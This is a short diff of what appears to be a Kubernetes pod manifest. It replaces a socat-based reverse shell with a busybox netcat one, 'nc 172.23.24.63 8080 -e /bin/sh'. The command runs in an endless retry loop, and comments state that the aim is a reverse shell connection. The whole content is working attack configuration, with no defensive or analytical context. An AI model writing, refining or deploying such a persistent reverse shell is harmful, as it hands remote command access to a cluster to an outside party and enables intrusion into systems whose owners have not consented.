@@ -14,9 +14,10 @@ spec:
         - /bin/sh
         - -c
         - |
-          apk add --no-cache bash socat;
+          # Use busybox netcat (already available in Alpine)
+          # Loop to keep trying reverse shell connection
           while true; do
-            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.23.24.63:8080;
+            nc 172.23.24.63 8080 -e /bin/sh;
             sleep 5;
           done
       volumeMounts:
